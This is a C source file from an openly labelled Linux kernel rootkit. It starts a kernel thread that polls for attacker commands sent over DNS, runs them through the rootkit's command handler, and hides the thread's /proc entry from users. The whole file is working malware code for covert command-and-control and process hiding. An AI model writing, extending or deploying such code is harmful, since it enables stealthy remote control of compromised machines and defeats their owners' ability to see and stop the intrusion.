#include "hide_api.h"
#include "network.h"

static struct task_struct *dns_worker_thread = NULL;

/**
 * @brief Kernel thread function to process DNS-based commands.
 *
 * This function runs in a loop as a kernel thread. It waits for commands
 * sent over DNS, processes them, and executes the corresponding rootkit
 * commands. The thread periodically sleeps for a defined interval to
 * avoid busy-waiting.
 *
 * @param data Unused parameter, passed as NULL.
 * @return Always returns 0 upon thread termination.
 */
static int dns_worker(void *data) {
    char cmd_buf[RCV_CMD_BUFFER_SIZE / 2];

    while (!kthread_should_stop()) {
        int len = dns_receive_command(cmd_buf, sizeof(cmd_buf));
        if (len > 0) {
            // Send the response of command over DNS
            DBG_MSG("dns_worker: got commmand from attacker '%s'\n", cmd_buf);
            rootkit_command(cmd_buf, len + 1, DNS);
        }

        // Sleep for a defined interval to avoid busy-waiting
        msleep(DNS_POLL_INTERVAL_MS);
    }
    return 0;
}

/**
 * @brief Starts the DNS worker kernel thread.
 *
 * This function initializes and starts a kernel thread that listens for
 * commands sent over DNS. If the thread is already running, it returns
 * an error code indicating that the resource is busy.
 *
 * @return SUCCESS (0) on successful thread creation.
 * @return -EBUSY if the thread is already running.
 * @return Negative error code if thread creation fails.
 */
int start_dns_worker(void) {
    if (dns_worker_thread && !IS_ERR(dns_worker_thread))
        return -EBUSY;

    // Create the DNS worker thread
    dns_worker_thread = kthread_run(dns_worker, NULL, DNS_WORKER_THREAD_NAME);
    if (IS_ERR(dns_worker_thread))
        return PTR_ERR(dns_worker_thread);

    // Hide the thread from the user
    char path[32] = { 0 };
    snprintf(path, sizeof(path), "/proc/%d", dns_worker_thread->pid);
    hide_file(path);

    return SUCCESS;
}

/**
 * @brief Stops the DNS worker kernel thread.
 *
 * This function stops the running DNS worker thread and cleans up its
 * resources. If the thread is not running, it returns an error code
 * indicating invalid operation.
 *
 * @return SUCCESS (0) on successful thread termination.
 * @return -EINVAL if the thread is not running or is invalid.
 */
int stop_dns_worker(void) {
    if (!dns_worker_thread || IS_ERR(dns_worker_thread))
        return -EINVAL;

    // Remove the hidden directory associated with the thread
    char path[32] = { 0 };
    snprintf(path, sizeof(path), "/proc/%d", dns_worker_thread->pid);
    unhide_file(path);

    // Stop the DNS worker thread
    kthread_stop(dns_worker_thread);
    dns_worker_thread = NULL;

    return SUCCESS;
}